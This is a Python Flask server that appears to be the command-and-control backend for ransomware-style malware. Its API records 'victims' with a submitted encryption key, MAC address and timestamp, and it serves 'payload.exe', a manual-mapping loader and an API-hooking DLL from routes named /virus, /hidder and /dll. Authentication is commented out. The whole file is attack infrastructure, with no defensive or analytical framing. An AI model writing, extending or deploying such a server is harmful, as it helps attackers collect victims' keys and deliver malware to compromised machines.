from flask import Flask, jsonify, abort, request, make_response, url_for, send_file
import time 

app = Flask(__name__, static_url_path="")

@app.errorhandler(400)
def not_found(error):
    return make_response(jsonify({'error': 'Bad request'}), 400)


@app.errorhandler(404)
def not_found(error):
    return make_response(jsonify({'error': 'Not found'}), 404)


victims = [
    {
        'id': 1,
        'key': u'NONE',
        'mac': u'NONE',
        'timestamp': u'NONE',
    },
    {
        'id': 2,
        'key': u'NONE',
        'mac': u'NONE',
        'timestamp': u'NONE',
    },
]


def make_public_victim(victim):
    new_victim = {}
    for field in victim:
        if field == 'id':
            new_victim['uri'] = url_for('get_victim', victim_id=victim['id'], _external=True)
        else:
            new_victim[field] = victim[field]
    return new_victim


@app.route('/api/v1/victims', methods=['GET'])
# @auth.login_required
def get_victims():
    return jsonify({'victims':  victims})


@app.route('/api/v1/victims/<int:victim_id>', methods=['GET'])
# @auth.login_required
def get_victim(victim_id):
    victim = filter(lambda t: t['id'] == victim_id, victims)
    if len(victim) == 0:
        abort(404)
    return jsonify({'victim': make_public_victim(victim[0])})


@app.route('/api/v1/victims', methods=['POST'])
# @auth.login_required
def create_victim():
    print("hello")
    print(request.json)
    if not request.json or not 'key' in request.json:
        abort(400)
    victim = {
        'id': victims[-1]['id'] + 1,
        'key': request.json['key'],
        'mac': request.json['mac'],
        'timestamp': int(time.time()),
    }
    victims.append(victim)
    return jsonify({'victim': make_public_victim(victim)}), 201


@app.route('/api/v1/victims/<int:victim_id>', methods=['DELETE'])
# @auth.login_required
def delete_victim(victim_id):
    victim = filter(lambda t: t['id'] == victim_id, victims)
    if len(victim) == 0:
        abort(404)
    victims.remove(victim[0])
    return jsonify({'result': True})

@app.route('/virus', methods=['GET'])
def download_virus():
    return send_file("payload.exe")

@app.route('/hidder', methods=['GET'])
def download_hidder():
    return send_file("ManualMappingTutorial.exe")

@app.route('/dll', methods=['GET'])
def download_dll():
    return send_file("APIHooking.dll")




if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80, debug=True)

